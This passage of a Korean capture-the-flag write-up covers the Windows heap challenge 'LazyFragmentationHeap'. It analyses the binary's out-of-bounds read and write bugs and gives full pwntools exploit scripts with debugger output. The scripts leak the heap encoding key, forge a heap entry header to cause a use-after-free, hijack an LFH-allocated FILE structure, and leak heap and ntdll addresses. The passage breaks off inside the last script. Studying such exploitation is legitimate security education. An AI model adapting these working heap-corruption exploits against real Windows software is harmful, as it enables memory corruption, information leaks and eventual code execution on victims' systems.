currIdx=0x00000000000000f5
currIdx=0x00000000000000f6
currIdx=0x00000000000000f7
currIdx=0x00000000000000f8
currIdx=0x00000000000000f9
currIdx=0x00000000000000fa
currIdx=0x00000000000000fb
currIdx=0x00000000000000fc
currIdx=0x00000000000000fd
currIdx=0x00000000000000fe
currIdx=0x00000000000000ff
currIdx=0x0000000000000000
currIdx=0x0000000000000001
currIdx=0x0000000000000002
currIdx=0x0000000000000003
currIdx=0x0000000000000067 <--- here, @AmarSaar's vuln has been mitigated
currIdx=0x0000000000000068
currIdx=0x0000000000000069
currIdx=0x000000000000006a
currIdx=0x000000000000006b
currIdx=0x000000000000006c
currIdx=0x000000000000006d
currIdx=0x000000000000006e
currIdx=0x000000000000006f
currIdx=0x0000000000000070
currIdx=0x0000000000000071
currIdx=0x0000000000000073
currIdx=0x0000000000000074
currIdx=0x0000000000000075
currIdx=0x0000000000000076
currIdx=0x0000000000000077
*/
```

제가 LFH에 대해 학습한 내용은 여기까지입니다. 이제 문제파일을 분석해보겠습니다.


# 4. 익스플로잇
아래와 같이 MENU 형식으로 입력을 받아 allocate, free, edit와 같은 동작을 수행할 수 있는 전형적인 Heap 문제로 보입니다.

```
*****************************
    LazyFragmentationHeap
*****************************
 1. Allocate buffer for File  // alloc
 2. Edit File content         // edit
 3. Show content              // show
 4. Clean content             // free
 5. LazyFileHandler
 6. Exit
****************************
```

처음 문제파일을 시작하면 [VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) 함수로 **0xBEEFDAD0000** 주소에 R/W 권한만 있는 메모리를 할당해 아래와 같은 40 bytes 크기의 구조체를 관리하는데 사용합니다.

```c
struct lazy_chunk {
    ULONGLONG magic1;    // 0x0000DDAABEEF1ACD      | offset 0
    ULONGLONG size;      // 0x80 <= size <= 0x2000  | offset 8
    ULONGLONG chunk_id;  // 0xDDAA                  | offset 16
    ULONGLONG magic2;    // 0x0000DDAABEEF1ACD      | offset 24
    BYTE *heap_mem;      // calloc(1, size)         | offset 32
}
```

처음 분석하고 나서 취약점이 있다고 의심이 간 부분은 `2. Edit File content`를 선택하면 실행하는 아래의 코드부분이었습니다.

```c
case 2i64:
// skip for brevity...
heap_mem_len = -1i64;
heam_mem = BEEFDAD0000_mem[idx2_1].heap_mem;
heap_size = BEEFDAD0000_mem[idx2_1].size;
do
  ++heap_mem_len;
while ( heam_mem[heap_mem_len] );
if ( heap_mem_len > heap_size && BEEFDAD0000_mem[idx2_1].magic2 == 0xDDAABEEF1ACDi64 )
{  // if magic2 is not corrupted, heap_size = heap_mem_len...OOB?
  heap_size = -1i64;
  do
    ++heap_size;
  while ( heam_mem[heap_size] );
}

if ( read(0, heam_mem, heap_size) <= 0 ) // potential OOB write
// skip for brevity...

```

주석으로 달아놓은 설명처럼 `heap_mem_len`을 이용한 OOB write가 가능해 보입니다.

`3. Show content`에도 아래와 같이 OOB read가 가능해보이는 코드가 있었습니다.

```c
case 3i64:
    // skip for brevity...
    if ( !BEEFDAD0000_mem[chunk_cnt].heap_mem )
        goto LABEL_59;
    if ( BEEFDAD0000_mem[chunk_cnt].magic1 != 0xDDAABEEF1ACDi64 )
        goto LABEL_59;
    v26 = BEEFDAD0000_mem[chunk_cnt].magic2;
    if ( v26 != 0xDDAABEEF1ACDi64 && v26 != 0xFACE6DA61A35C767i64 )
        goto LABEL_59;

    // potential OOB read, possible to leak _HEAP_ENTRY data
    printf("Content: %s\n", BEEFDAD0000_mem[chunk_cnt].heap_mem); 
    // skip for brevity...
```


그래서 OOB read로 뒤에 위치한 heap chunk의 ( **_HEAP->Encoding**로 인코딩된 ) header를 leak할 수 있는 size들을 찾기 위해 아래와 같이 Brute-force했습니다.

```python
from pwn import *

# context.log_level = "debug"

# HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
HOST = "192.168.0.18" # VirtualBox Bridge 
PORT = 6677

hi = None
sla = None

def alloc(chunk_id, size):
	sla("Your choice: ", str(1))
 	sla("Size:", str(size))
	sla("ID:", str(chunk_id))

def edit(chunk_id, val, need_newline=True):
	sla("Your choice: ", str(2))
	sla("ID:", str(chunk_id))
	if need_newline:
		sla("Content:", val)
	else:
		hi.sendafter("Content:", val)

def show(chunk_id):
	sla("Your choice: ", str(3))
	sla("ID:", str(chunk_id))
	return hi.recvline().strip().split("Content: ")[-1]

def free(chunk_id):
	sla("Your choice: ", str(4))
	sla("ID:", str(chunk_id))

def open_file():
	sla("Your choice: ", str(5))
	sla("Your choice: ", str(1))
	sla("Your choice: ", str(3))

def read_file(chunk_id, size):
	sla("Your choice: ", str(5))
	sla("Your choice: ", str(2))
	sla("ID:", str(chunk_id))
 	sla("Size:", str(size))
	sla("Your choice: ", str(3))

cnt = 0
hi = remote(HOST, PORT)
sla = hi.sendlineafter
for i in range(0x80, 0x2000, 0x8):
	if cnt == 10: # only 10 heap chunks can be allocated
		context.log_level = "error"
		sla("Your choice: ", str(6))
		hi.close()
		hi = remote(HOST, PORT)
		sla = hi.sendlineafter
		cnt = 0
		context.log_level = "info"

	alloc(i, i)
	edit(i, "A" * i)
	leak = show(i)[i:]
	if leak != "":
		leak = u64(leak.ljust(8, p8(0)))
		log.info("size 0x%04x can be usable to info leak( 0x%016x )" % (i, leak))

	cnt += 1

hi.close()

'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] size 0x0088 can be usable to info leak( 0x00005de64b3b5de3 )
[*] size 0x0098 can be usable to info leak( 0x00005de54b3b5de3 )
[*] size 0x00a8 can be usable to info leak( 0x00005de44b3b5de3 )
[*] size 0x00b8 can be usable to info leak( 0x00005de34c3b5de4 )
[*] size 0x00c8 can be usable to info leak( 0x00005de24c3b5de4 )
[*] size 0x00d8 can be usable to info leak( 0x00002e9102b2a6f5 )
[*] size 0x00e8 can be usable to info leak( 0x00002e9012b2a6e5 )
[*] size 0x00f8 can be usable to info leak( 0x00002e8f02b2a6f5 )
[*] size 0x0108 can be usable to info leak( 0x00002e8e07b2a6f0 )
[*] size 0x0118 can be usable to info leak( 0x00002e8de5b3a613 )
[*] size 0x0128 can be usable to info leak( 0x0000ceb77fd0cded )
[*] size 0x0138 can be usable to info leak( 0x0000ceb027d0cdb5 )
[*] size 0x0148 can be usable to info leak( 0x0000ceb10dd0cd9f )
[*] size 0x0158 can be usable to info leak( 0x0000ceb2f9d0cd6b )
[*] size 0x0168 can be usable to info leak( 0x0000ceb3abd0cd39 )
[*] size 0x0178 can be usable to info leak( 0x00001fb485bbdffe )
[*] size 0x0188 can be usable to info leak( 0x00001fb5fbbbdf80 )
[*] size 0x0198 can be usable to info leak( 0x00001fb62fbbdf54 )
[*] size 0x01a8 can be usable to info leak( 0x00001fb761bbdf1a )
[*] size 0x01b8 can be usable to info leak( 0x00001fb059bbdf22 )
[*] size 0x01c8 can be usable to info leak( 0x0000b3a2b2d6edd0 )
[*] size 0x01d8 can be usable to info leak( 0x0000b3a1eed6ed8c )
[*] size 0x01e8 can be usable to info leak( 0x0000b3a028d6ed4a )
...
'''
```

디코딩된 header의 값은 항상 고정되어 있기 때문에 이를 이용해 **_HEAP->Encoding** 값을 leak할 수 있습니다.

```python
# skip for brevity...

SIZE = 0xC8    # yes, I intend korean slang
alloc(1, SIZE)
edit(1, "A" * SIZE)
heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
log.info("_HEAP->Encoding = 0x%016x" % heap_encod)
pause()

'''
$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP->Encoding = 0x0000f300f8d50db2
[*] Paused (press any to continue)
....
0:001> dqs beefdad0000 l5
00000bee`fdad0000  0000ddaa`beef1acd
00000bee`fdad0008  00000000`000000c8
00000bee`fdad0010  00000000`00000001
00000bee`fdad0018  face6da6`1a35c767
00000bee`fdad0020  000001e5`30874370
0:001> !heap -p -a 000001e5`30874370
    address 000001e530874370 found in
    _HEAP @ 1e530870000
              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
        000001e530874360 000d 0000  [00]   000001e530874370    000c8 - (busy)
          unknown!noop

0:001> dqs 1e530870000+80 l2
000001e5`30870080  00000000`00000000
000001e5`30870088  0000f300`f8d50db2
'''
```

` 1. Allocate buffer for File`로 할당한 Heap chunk들은 LFH로 관리되지 않기 때문에, **_HEAP->Encoding**만 알고 있다면 OOB write 취약점을 사용해 header를 조작할 수 있습니다. 

이제 서로 인접한 heap chunk 2개를 할당해 header를 조작해줘야 하는데, 정확히 어떤 크기로 할당해줘야 서로 인접하게 할당되는지 알 수 없어 이부분도 header가 leak되는 걸 기준삼아 아래와 같이 Brute-Force해서 찾았습니다.

```python
# skip for brevity...

# this takes too many times
# modify the Brute-Force range to use your instinct
for i in range(0x80, 0x2000, 8):
	log.info("i = 0x%04x" % i)
	for j in range(0x80, 0x2000, 8*8):
		log.info("j = 0x%04x" % j)
		alloc(1, SIZE)
		alloc(2, i)
		edit(2, "A" * i)
		for k in range(8):
			tmp_sz = j + (8*k)
			alloc(3+k, tmp_sz)
			leak = show(2)[i:]
			if leak != "":
				log.info("chunk1 size = 0x%x, chunk2 size = 0x%x" % (i, tmp_sz))
				break

		context.log_level = "error"
		sla("Your choice: ", str(6))
		hi.close()
		hi = remote(HOST, PORT)
		sla = hi.sendlineafter
		context.log_level = "info"

'''
$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] i = 0x0080
[*] j = 0x0080
[*] j = 0x00C0
[*] j = 0x0100
[*] j = 0x0140
....
[*] chunk1 size = 0x268, chunk2 size = 0x200
....
'''
```

이제 어떻게 크기를 할당해야 서로 인접한 chunk를 할당할 수 있는지 알았으니, `5. LazyFileHandler`로 **magic.txt**에서 읽어들인 값을 채워넣어 중간에 null-byte가 없게 한 뒤, OOB write 취약점을 사용해 header를 조작할 수 있습니다.

```python
# skip for brevity...

alloc(1, SIZE)
edit(1, "A" * SIZE)
heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
log.info("_HEAP->Encoding = 0x%016x" % heap_encod)
alloc(2, 0x268)
alloc(3, 0x200)

fake_entry = 0x10000027c80101c8 ^ heap_encod
'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''
log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)

open_file()
read_file(2, 0x268)
edit(2, "A" * 0x268 + p64(fake_entry)[:6], False)
pause()

'''
0:001> dqs beefdad0000 lf
00000bee`fdad0000  0000ddaa`beef1acd
00000bee`fdad0008  00000000`000000c8
00000bee`fdad0010  00000000`00000001
00000bee`fdad0018  face6da6`1a35c767
00000bee`fdad0020  00000165`a3ed4370

00000bee`fdad0028  0000ddaa`beef1acd
00000bee`fdad0030  00000000`00000268
00000bee`fdad0038  00000000`00000002
00000bee`fdad0040  face6da6`1a35c767
00000bee`fdad0048  00000165`a3edff40

00000bee`fdad0050  0000ddaa`beef1acd
00000bee`fdad0058  00000000`00000200
00000bee`fdad0060  00000000`00000003
00000bee`fdad0068  0000ddaa`beef1acd
00000bee`fdad0070  00000165`a3ee01b0

0:001> !heap -p -a 00000165`a3ee01b0
    address 00000165a3ee01b0 found in
    _HEAP @ 165a3ed0000
              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
        00000165a3ee01a0 01c8 0000  [00]   00000165a3ee01b0    01c70 - (busy)
'''
```

이제 이 취약점을 어떻게 사용할 수 있을지 고민해봐야 합니다.

지금까지 찾아낸 OOB 취약점을 이용해서는 Heap chunk만 조작할 수 있기 때문에, [3.10. Allocate/Free Non-LFH chunk](#310-Allocate/Free-Non-LFH-chunk)에서 설명한 것처럼 Non-LFH chunk의 경우 할당해제시 인접한 Heap chunk를 탐색하며 병합( coalesce )처리한다는 원리를 이용해볼 수 있습니다.

그렇기 때문에 OOB write로 조작한 size의 범위안에 다른 Heap chunk가 있다면 그 chunk도 같이 할당해제되서 UAF가 발생해 아래처럼 Heap 주소를 leak할 수 있습니다.

```python
# skip for brevity...

alloc(1, SIZE)
edit(1, "A" * SIZE)
heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
log.info("_HEAP->Encoding = 0x%016x" % heap_encod)
alloc(2, 0x268)
alloc(3, 0x200)

fake_entry = 0x10000027c80101c8 ^ heap_encod
'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x008 SubSegmentCode   : 0xc80101c8
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''
log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)

alloc(4, 0x1c80 -  # fake chunk size 
         0x20   -  # sizeof(_HEAP_ENTRY) * 2
		 0x200     # original size of overwritten chunk
) 

open_file()
read_file(2, 0x268)
edit(2, "A" * 0x268 + p64(fake_entry)[:6], False)

free(3)         # free coalesce mechanism also free'ing chunk 4
alloc(3, 0x200) # set Flink and Blink at chunk 4

heap_leak = u64(show(4)[:8].ljust(8, p8(0)))
log.info("leaked heap addr = 0x%016x" % heap_leak)
pause()

'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP->Encoding = 0x0000d60f1a72815a
[*] fake XOR'ed _HEAP_ENTRY = 0x1000d628d2738092
[*] leaked heap addr = 0x000002478ae70150
[*] Paused (press any to continue)
....
0:001> dqs beefdad0000 l14
....
00000bee`fdad0078  0000ddaa`beef1acd
00000bee`fdad0080  00000000`00001a60
00000bee`fdad0088  00000000`00000004
00000bee`fdad0090  0000ddaa`beef1acd
00000bee`fdad0098  00000247`8ae803c0
0:001> dqs 247`8ae803c0 l2
00000247`8ae803c0  00000247`8ae70150
00000247`8ae803c8  00000247`8ae82e40
0:001> !heap
        Heap Address      NT/Segment Heap

         2478ae70000              NT Heap
         2478ac10000              NT Heap
         2478b0a0000              NT Heap
'''
```

leak된 heap 주소의 offset이 항상 0x150( **_HEAP->FreeLists** )으로 고정되어 있기 때문에 Heap chunk들을 관리하는 **_HEAP** 구조체의 주소를 안정적으로 구할 수 있습니다.

분석하다 알게된 신기한 사실 중 하나는 `5. LazyFileHandler`에서 `1. ReadFile`로 **magic.txt**에 대한 FILE 구조체를 생성하면 해당 구조체가 LFH가 활성화된 Heap 영역에 할당된다는 점입니다.

```
0:001> dqs lazyfragmentationheap+5628 l1
00007ff6`521f5628  000001b7`d069a8b0

0:001> !heap -i 000001b7`d069a8b0-10
Detailed information for block entry 000001b7d069a8a0
Assumed heap       : 0x000001b7d0690000 (Use !heap -i NewHeapHandle to change)
Header content     : 0xE76D0D32 0x88000D43
Block flags        : 0x1 LFH (busy )
Total block size   : 0x6 units (0x60 bytes)
Requested size     : 0x58 bytes (unused 0x8 bytes)
Subsegment         : 0x000001b7d069bb90
```

LFH는 **_HEAP_SUBSEGMENT->BlockCount**보다 많은 개수의 Heap chunk를 생성하게 되면 새로운 UserBlock과 SubSegment를 할당해 사용합니다. 이러한 원리를 이용해 LFH가 UAF로 접근할 수 있는 chunk 4를 사용하게 만든다면 아래와 같이 FILE 구조체를 조작할 수 있습니다.

```python
# skip for brevity...

alloc(1, SIZE)
edit(1, "A" * SIZE)
try:
	heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
except struct.error:
	log.error("_HEAP_ENTRY not leaked")
	sys.exit(-1)

log.info("_HEAP->Encoding = 0x%016x" % heap_encod)
alloc(2, 0x268)
alloc(3, 0x200)

fake_entry = 0x10000027c80101c8 ^ heap_encod
'''
0x10000027c80101c8
   +0x008 Size             : 0x1c8
   +0x00a Flags            : 0x1 ''
   +0x00b SmallTagIndex    : 0xc8 ''
   +0x008 SubSegmentCode   : 0xc80101c8
   +0x00c PreviousSize     : 0x27
   +0x00e SegmentOffset    : 0 ''
   +0x00e LFHFlags         : 0 ''
   +0x00f UnusedBytes      : 0x10 ''
'''
log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)

alloc(4, 0x1c80 -  # fake chunk size 
         0x20   -  # sizeof(_HEAP_ENTRY) * 2
         0x200     # orginal size of overwritten chunk
) 

open_file()
read_file(2, 0x268)
edit(2, "A" * 0x268 + p64(fake_entry)[:6], False)

free(3)         # free coalesce mechanism also free'ing chunk 4
alloc(3, 0x200) # set Flink and Blink at chunk 4

heap_base = u64(show(4)[:8].ljust(8, p8(0))) - 0x150
if heap_base == 0:
	log.error("Heap address not leaked")
	sys.exit(-1)

log.info("&_HEAP = 0x%016x" % heap_base)

# make LFH to allocate new Userblock in chunk 4
for _ in range(0x14):
	open_file()

pause()

'''
0:001> dqs beefdad0000+(0x28*3) l5
00000bee`fdad0078  0000ddaa`beef1acd
00000bee`fdad0080  00000000`00001a60 <------------|
00000bee`fdad0088  00000000`00000004              |
00000bee`fdad0090  0000ddaa`beef1acd              |
00000bee`fdad0098  00000128`446003c0              |---- profit!
0:001> dqs lazyfragmentationheap+5628 l1          |
00007ff7`6f405628  00000128`44600950              |
0:001> ? 00000128`44600950-00000128`446003c0      |
Evaluate expression: 1424 = 00000000`00000590 <---|
'''
```

FILE 구조체를 이용한 공격기법은 Angelboy가 작성한 [Play with FILE Structure - Yet Another Binary Exploit Technique](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)에 잘 정리되어 있지만 Linux를 기준으로 설명하고 있어 Windows의 FILE 구조체와는 약간 다른데 이 부분은 디버거로 보면 바로 보이기 때문에 FILE 구조체가 어떤 구조를 가지고 있는지 분석하는 건 그닥 어렵지 않습니다. 

**_HEAP** 구조체의 주소를 알고 있으니 해당 구조체 근처에서 구할 수 있는 **ntdll.dll**의 주소부터 leak해보겠습니다.

```python
# skip for brevity...

# make LFH to allocate new Userblock in chunk 4
for _ in range(0x14):
	open_file()

fake_HEAP_USERDATA_HEADER = ""
fake_HEAP_USERDATA_HEADER += p64(heap_base + 0xbcd0)   # +0x000 SubSegment
fake_HEAP_USERDATA_HEADER += p64(heap_base + 0x12e40)  # +0x008 Reserved
fake_HEAP_USERDATA_HEADER += p32(0xc)                  # +0x010 SizeIndexAndPadding
fake_HEAP_USERDATA_HEADER += p32(0xf0e0d0c0)           # +0x014 Signature
fake_HEAP_USERDATA_HEADER += p64(0) * 5                # I couldn't leak other values

fake_FILE = ""
fake_FILE += p64(0) * 2              # _HEAP_ENTRY
fake_FILE += p64(heap_base + 0x2C0)  # cursor of SEEK_CUR, _HEAP->LockVariable->Lock
fake_FILE += p64(heap_base)          # base address, &_HEAP
fake_FILE += p32(0x800)              # remaining file size
fake_FILE += p32(0x2041)             # I dunno what they are
fake_FILE += p64(0x17)				
fake_FILE += p64(0x1000)
fake_FILE += p64(0)
fake_FILE += p64(0xffffffffffffffff)
fake_FILE += p64(0xffffffff)
fake_FILE += p64(0)
fake_FILE += p64(0)

for_leak = ""
for_leak += fake_HEAP_USERDATA_HEADER
for_leak += fake_FILE * (0x1000 / len(fake_FILE))

edit(4, for_leak)
alloc(5, SIZE)
read_file(5,8)
ntdll_base = u64(show(5)[:8].ljust(8, p8(0))) - 0x163d70

log.info("&ntdll = 0x%016x" % ntdll_base)

pause()
hi.close()

'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP->Encoding = 0x0000b6942c981917
[*] fake XOR'ed _HEAP_ENTRY = 0x1000b6b3e49918df
[*] &_HEAP = 0x0000018809710000
[*] &ntdll = 0x00007ffd09b00000
[*] Paused (press any to continue)
....
0:001> ? ntdll
Evaluate expression: 140724765982720 = 00007ffd`09b00000
'''
```

그리고 주소를 계속 leak해보다가 알게된 건데 정확한 이유는 알 수 없지만 프로세스가 바뀌더라도 **LazyFragmentationHeap.exe**를 포함해 로드된 모듈들의 주소는 변하지 않았습니다.

```
$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP->Encoding = 0x0000ded8a1942b54
[*] fake XOR'ed _HEAP_ENTRY = 0x1000deff69952a9c
[*] &_HEAP = 0x000001c50e7e0000
[*] &ntdll = 0x00007ffd09b00000 <------------------------------|
[*] Closed connection to 192.168.0.18 port 6677                |
                                                               |
$ python ex.py                                                 |
[+] Opening connection to 192.168.0.18 on port 6677: Done      |
[*] _HEAP->Encoding = 0x000072da0f33e8bf                       |
[*] fake XOR'ed _HEAP_ENTRY = 0x100072fdc732e977               |
[*] &_HEAP = 0x0000019898950000                                |
[*] &ntdll = 0x00007ffd09b00000 <------------------------------|
```

어차피 FILE 구조체를 통해 데이터를 읽어들이는 횟수에 제한을 두고 있어서, FILE 구조체를 이용한 주소 leak은 프로세스 당 한번씩만 할 수 있기 때문에 아래와 같이 코드를 수정했습니다.

```python
from pwn import *

# context.log_level = "debug"

# HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
HOST = "192.168.0.18" # VirtualBox Bridge 
PORT = 6677
SIZE = 0xC8 # yes, I intend korean slang

hi = None
sla = None

def alloc(chunk_id, size):
	sla("Your choice: ", str(1))
 	sla("Size:", str(size))
	sla("ID:", str(chunk_id))

def edit(chunk_id, val, need_newline=True):
	sla("Your choice: ", str(2))
	sla("ID:", str(chunk_id))
	if need_newline:
		sla("Content:", val)
	else:
		hi.sendafter("Content:", val)

def show(chunk_id):
	sla("Your choice: ", str(3))
	sla("ID:", str(chunk_id))
	return hi.recvline().strip().split("Content: ")[-1]

def free(chunk_id):
	sla("Your choice: ", str(4))
	sla("ID:", str(chunk_id))

def open_file():
	sla("Your choice: ", str(5))
	sla("Your choice: ", str(1))
	sla("Your choice: ", str(3))

def read_file(chunk_id, size):
	sla("Your choice: ", str(5))
	sla("Your choice: ", str(2))
	sla("ID:", str(chunk_id))
 	sla("Size:", str(size))
	sla("Your choice: ", str(3))


def leak(cursor=0):
	global hi, sla
	context.log_level = "error"
	hi = remote(HOST, PORT)
	sla = hi.sendlineafter

	alloc(1, SIZE)
	edit(1, "A" * SIZE)
	try:
		heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
	except struct.error:
		log.info("_HEAP_ENTRY not leaked")
		return

	# log.info("_HEAP->Encoding = 0x%016x" % heap_encod)

	alloc(2, 0x268)
	alloc(3, 0x200)
	fake_entry = 0x10000027c80101c8 ^ heap_encod
	'''
	0x10000027c80101c8
	   +0x008 Size             : 0x1c8
	   +0x00a Flags            : 0x1 ''
	   +0x00b SmallTagIndex    : 0xc8 ''
	   +0x008 SubSegmentCode   : 0xc80101c8
	   +0x00c PreviousSize     : 0x27
	   +0x00e SegmentOffset    : 0 ''
	   +0x00e LFHFlags         : 0 ''
	   +0x00f UnusedBytes      : 0x10 ''
	'''

	# log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)

	alloc(4, 0x1c80 -  # fake chunk size 
	         0x20   -  # sizeof(_HEAP_ENTRY) * 2
	         0x200     # orginal size of overwritten chunk
	) 
	open_file()
	read_file(2, 0x268)
	edit(2, "A" * 0x268 + p64(fake_entry)[:6], False)
	free(3)         # free coalesce mechanism also free'ing chunk 4
	alloc(3, 0x200) # set Flink and Blink at chunk 4

	heap_base = u64(show(4)[:8].ljust(8, p8(0))) - 0x150
	if heap_base == 0:
		log.info("Heap address not leaked")
        return

	# default target is ntdll on _HEAP->LockVariable->Lock
	if cursor == 0:
		cursor = heap_base + 0x2c0
		
	# log.info("&_HEAP = 0x%016x" % heap_base)

	# make LFH to allocate new Userblock in chunk 4
	for _ in range(0x14):
		open_file()

	fake_HEAP_USERDATA_HEADER = ""
	fake_HEAP_USERDATA_HEADER += p64(heap_base + 0xbcd0)   # +0x000 SubSegment
	fake_HEAP_USERDATA_HEADER += p64(heap_base + 0x12e40)  # +0x008 Reserved
	fake_HEAP_USERDATA_HEADER += p32(0xc)                  # +0x010 SizeIndexAndPadding
	fake_HEAP_USERDATA_HEADER += p32(0xf0e0d0c0)           # +0x014 Signature
	fake_HEAP_USERDATA_HEADER += p64(0) * 5                # I couldn't leak other values

	fake_FILE = ""
	fake_FILE += p64(0) * 2              # _HEAP_ENTRY
	fake_FILE += p64(cursor)             # cursor of SEEK_CUR
	fake_FILE += p64(cursor & ~0xfff)    # base address
	fake_FILE += p32(0x800)              # remaining file size
	fake_FILE += p32(0x2041)             # I dunno what they are
	fake_FILE += p64(0x17)				
	fake_FILE += p64(0x1000)
	fake_FILE += p64(0)
	fake_FILE += p64(0xffffffffffffffff)
	fake_FILE += p64(0xffffffff)
	fake_FILE += p64(0)
	fake_FILE += p64(0)

	for_leak = ""
	for_leak += fake_HEAP_USERDATA_HEADER
	for_leak += fake_FILE * (0x1000 / len(fake_FILE))

	edit(4, for_leak)
	alloc(5, SIZE)
	read_file(5,8)
	result = u64(show(5)[:8].ljust(8, p8(0)))

	sla("Your choice: ", str(6))
	hi.close()
	context.log_level = "info"
	return result


ntdll_base = leak() - 0x163d70
log.info("ntdll = 0x%016x" % ntdll_base)
```

**ntdll.dll**은 아무래도 Windows의 핵심 모듈이다 보니 외부 모듈을 참조하지 않아 IAT는 없지만, 내부적으로 **PebLdr**이라고 **_PEB->Ldr**가 가리키는 로드된 모듈끼리의 Double Linked List가 존재합니다.

```
0:001> dt ntdll!_PEB @$peb Ldr
   +0x018 Ldr : 0x00007ffd`09c653c0 _PEB_LDR_DATA <---------|
                                                            |
0:001> ? ntdll!PebLdr                                       |
Evaluate expression: 140724767445952 = 00007ffd`09c653c0 <--|

0:001> dt ntdll!_PEB_LDR_DATA 00007ffd`09c653c0
   +0x000 Length           : 0x58
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702780 - 0x0000016c`d7705d20 ]
   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702790 - 0x0000016c`d7705d30 ]
   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702610 - 0x0000016c`d7702e40 ]
   +0x040 EntryInProgress  : (null) 
   +0x048 ShutdownInProgress : 0 ''
   +0x050 ShutdownThreadId : (null) 

0:001> dqs 16c`d7702780
0000016c`d7702780  0000016c`d77025f0
0000016c`d7702788  00007ffd`09c653d0 ntdll!PebLdr+0x10
0000016c`d7702790  0000016c`d7702600
0000016c`d7702798  00007ffd`09c653e0 ntdll!PebLdr+0x20
0000016c`d77027a0  00000000`00000000
0000016c`d77027a8  00000000`00000000
0000016c`d77027b0  00007ff7`6f400000 LazyFragmentationHeap
0000016c`d77027b8  00007ff7`6f401bf0 LazyFragmentationHeap+0x1bf0
....
```

분석을 하다 알게되었는데, **_PEB_LDR_DATA->InLoadOrderModuleList**가 가리키는 Heap 영역의 offset이 항상 **0x27b0**으로 고정되어 있어 아래와 같이 바로 leak할 수 있고, IAT를 통해 다른 라이브러리의 주소도 구할 수 있었습니다.

```python
from pwn import *

# context.log_level = "debug"

# HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
HOST = "192.168.0.18" # VirtualBox Bridge 
PORT = 6677
SIZE = 0xC8 # yes, I intend korean slang

hi = None
sla = None

def alloc(chunk_id, size):
	sla("Your choice: ", str(1))
 	sla("Size:", str(size))
	sla("ID:", str(chunk_id))

def edit(chunk_id, val, need_newline=True):
	sla("Your choice: ", str(2))
	sla("ID:", str(chunk_id))
	if need_newline:
		sla("Content:", val)
	else:
		hi.sendafter("Content:", val)

def show(chunk_id):
	sla("Your choice: ", str(3))
	sla("ID:", str(chunk_id))
	return hi.recvline().strip().split("Content: ")[-1]

def free(chunk_id):
	sla("Your choice: ", str(4))
	sla("ID:", str(chunk_id))

def open_file():
	sla("Your choice: ", str(5))
	sla("Your choice: ", str(1))
	sla("Your choice: ", str(3))

def read_file(chunk_id, size):
	sla("Your choice: ", str(5))
	sla("Your choice: ", str(2))
	sla("ID:", str(chunk_id))
 	sla("Size:", str(size))
	sla("Your choice: ", str(3))


def leak(cursor=0, disconn=True, leakLazy=False):
	global hi, sla
	context.log_level = "error"
	hi = remote(HOST, PORT)
	sla = hi.sendlineafter

	alloc(1, SIZE)
	edit(1, "A" * SIZE)
	try:
		heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
	except struct.error:
		log.info("_HEAP_ENTRY not leaked")
		return

	# log.info("_HEAP->Encoding = 0x%016x" % heap_encod)

	alloc(2, 0x268)
	alloc(3, 0x200)
	fake_entry = 0x10000027c80101c8 ^ heap_encod
	'''
	0x10000027c80101c8
	   +0x008 Size             : 0x1c8
	   +0x00a Flags            : 0x1 ''
	   +0x00b SmallTagIndex    : 0xc8 ''
	   +0x008 SubSegmentCode   : 0xc80101c8
	   +0x00c PreviousSize     : 0x27
	   +0x00e SegmentOffset    : 0 ''
	   +0x00e LFHFlags         : 0 ''
	   +0x00f UnusedBytes      : 0x10 ''
	'''

	# log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)

	alloc(4, 0x1c80 -  # fake chunk size 
	         0x20   -  # sizeof(_HEAP_ENTRY) * 2
	         0x200     # orginal size of overwritten chunk
	) 
	open_file()
	read_file(2, 0x268)
	edit(2, "A" * 0x268 + p64(fake_entry)[:6], False)
	free(3)         # free coalesce mechanism also free'ing chunk 4
	alloc(3, 0x200) # set Flink and Blink at chunk 4

	heap_base = u64(show(4)[:8].ljust(8, p8(0))) - 0x150
	if heap_base == 0:
		log.info("Heap address not leaked")
		return

	if leakLazy:
		cursor = heap_base + 0x27b2 # can't leak null-byte
